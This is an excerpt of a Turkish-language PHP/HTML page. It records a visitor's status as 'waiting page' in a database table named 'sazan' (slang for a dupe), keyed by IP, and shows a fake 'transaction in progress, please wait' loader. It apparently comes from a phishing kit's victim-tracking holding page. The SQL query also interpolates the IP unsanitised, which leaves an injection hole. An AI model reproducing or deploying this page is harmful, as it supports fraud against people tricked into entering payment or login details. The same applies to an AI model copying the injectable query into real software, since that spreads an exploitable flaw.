...
mysqli_query($mysqli, "UPDATE sazan SET now = 'Bekleme Sayfası' WHERE ip = '{$ip}'");
...
?>
<html class="no-js test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains test-supports test-csstransforms3d test-history test-target test-texttrackapi test-track test-no-contains" lang="tr"><head><script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
...
<nav class="methodSelector">
        ...
        <section id="pageContent">
                <fieldset>
                <div class="loader" style=""><img src="assets/img/form-progress.svg" alt="...">İşleminiz devam ediyor. Lütfen bekleyiniz...
                </div>
                </fieldset>
